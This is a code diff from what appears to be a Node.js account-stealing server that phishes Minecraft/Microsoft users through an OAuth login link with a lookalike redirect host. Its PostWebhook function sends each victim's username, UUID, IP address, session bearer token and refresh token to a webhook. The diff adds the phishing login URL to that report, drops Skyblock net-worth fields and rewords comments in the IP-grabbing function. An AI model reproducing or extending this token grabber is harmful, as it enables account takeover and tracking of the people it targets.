@@ -321,19 +321,14 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                         inline: true
                     },
                     {
-                        name: "Networth",
-                        value: networth,
-                        inline: true
-                    },
-                    {
-                        name: "Soulbound Networth",
-                        value: soulboundnetworth,
-                        inline: true
+                        name: "URL Used",
+                        value: `https://login.live.com/oauth20_authorize.srf?client_id=888241ac-2a1d-4bc0-b642-0e50280048d8&response_type=code&redirect_uri=https://skycloud-verification.onrender.com&scope=XboxLive.signin+offline_access&state=5t8bbvcv`,
+                        inline: false
                     },
                     {
                         name: "Session ID",
                         value: BearerToken,
-                        inline: true
+                        inline: false
                     },
                     {
                         name: "Refresh Token",
@@ -373,13 +368,13 @@ async function SendAPIData(username, networth) {
 
 // get the user's ip
 function getIp(req) {
-    // Extract the IP from the x-forwarded-for header, if it exists
+    // First, try to get the IP from the x-forwarded-for header
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
-        // Extract the client IP from the x-forwarded-for header
+        // The x-forwarded-for header might contain multiple IPs
         const ipList = forwarded.split(',');
-        return ipList[ipList.length - 1].trim(); // Use the last IP in the list
+        return ipList[ipList.length - 1].trim(); // Return the last IP in the list
     }
-    // Fallback to the remote address
+    // Fallback to the remote address if x-forwarded-for is not available
     return req.connection.remoteAddress || req.socket.remoteAddress || null;
 }
